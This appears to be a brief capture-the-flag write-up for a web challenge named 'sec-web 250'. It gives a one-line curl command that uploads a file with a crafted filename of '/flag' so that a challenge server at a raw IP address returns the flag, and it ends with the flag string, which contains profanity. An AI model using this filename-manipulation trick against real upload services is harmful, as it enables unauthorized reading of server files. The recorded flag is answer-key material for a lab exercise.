# sec-web 250
#### yes another one, go http://195.154.231.70:5341

[sec-web.zip](https://github.com/gamer-1478/unreal-ctf/blob/main/sec.zip)

found a writeup for this challenge - https://iwanflagz.github.io/RaRCTF-2021-writeups/web/secureuploader.html

following it, my sol was

```bash
curl -v -L -F "file=@shop;filename=/flag" http://195.154.231.70:5341/upload
```
shop can be changed for any file avaiable on your desktop. 

which gives the flag 
``` 
Flag - unreal{m07h3rfuck1n6_j01n}
``` 
